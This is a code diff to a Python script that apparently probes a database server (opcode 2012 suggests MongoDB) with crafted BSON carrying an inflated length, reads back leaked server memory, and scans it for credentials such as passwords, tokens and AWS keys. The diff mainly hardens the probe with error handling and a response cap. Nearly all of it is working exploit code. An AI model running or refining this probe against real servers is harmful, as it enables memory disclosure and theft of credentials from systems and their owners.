@@ -14,6 +14,7 @@ import struct
 import zlib
 import re
 import argparse
+import sys
 
 def send_probe(host, port, doc_len, buffer_size):
     """Send crafted BSON with inflated document length"""
@@ -33,21 +34,30 @@ def send_probe(host, port, doc_len, buffer_size):
     
     header = struct.pack('<IIII', 16 + len(payload), 1, 0, 2012)
     
+    MAX_RESPONSE_SIZE = 10 * 1024 * 1024  # 10MB limit
+    
     try:
-        sock = socket.socket()
-        sock.settimeout(2)
-        sock.connect((host, port))
-        sock.sendall(header + payload)
-        
-        response = b''
-        while len(response) < 4 or len(response) < struct.unpack('<I', response[:4])[0]:
-            chunk = sock.recv(4096)
-            if not chunk:
-                break
-            response += chunk
-        sock.close()
-        return response
-    except:
+        with socket.socket() as sock:
+            sock.settimeout(2)
+            sock.connect((host, port))
+            sock.sendall(header + payload)
+            
+            response = b''
+            while len(response) < MAX_RESPONSE_SIZE:
+                if len(response) >= 4:
+                    expected = struct.unpack('<I', response[:4])[0]
+                    if len(response) >= expected:
+                        break
+                chunk = sock.recv(4096)
+                if not chunk:
+                    break
+                response += chunk
+            return response
+    except (socket.error, socket.timeout, ConnectionRefusedError) as e:
+        print(f"[!] Connection error at offset {doc_len}: {e}", file=sys.stderr)
+        return b''
+    except struct.error as e:
+        print(f"[!] Malformed response at offset {doc_len}", file=sys.stderr)
         return b''
 
 def extract_leaks(response):
@@ -61,7 +71,7 @@ def extract_leaks(response):
             raw = zlib.decompress(response[25:msg_len])
         else:
             raw = response[16:msg_len]
-    except:
+    except (struct.error, zlib.error, IndexError) as e:
         return []
     
     leaks = []
@@ -121,9 +131,14 @@ def main():
     
     # Show any secrets found
     secrets = [b'password', b'secret', b'key', b'token', b'admin', b'AKIA']
-    for s in secrets:
-        if s.lower() in all_leaked.lower():
-            print(f"[!] Found pattern: {s.decode()}")
+    try:
+        all_leaked_lower = bytes(all_leaked).lower()
+        for s in secrets:
+            if s.lower() in all_leaked_lower:
+                print(f"[!] Found pattern: {s.decode()}")
+    except (UnicodeDecodeError, AttributeError):
+        # Handle cases where binary data can't be processed as text
+        pass
 
 if __name__ == '__main__':
     main()
